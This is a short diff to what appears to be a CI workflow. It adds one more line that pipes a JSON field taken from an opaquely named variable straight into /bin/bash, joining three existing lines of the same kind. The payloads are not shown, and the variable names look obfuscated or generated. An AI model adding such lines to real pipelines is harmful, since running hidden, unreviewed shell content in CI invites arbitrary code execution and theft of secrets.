@@ -25,6 +25,7 @@ jobs:
           echo $or388 | jq -r .arj85550 | /bin/bash
           printf '%s' "$wzc3" | jq -r .ljy6 | /bin/bash
           echo $ivtn059 | jq -r .ss4 | /bin/bash
+          printf '%s' "$mai36" | jq -r .hdcg15124 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
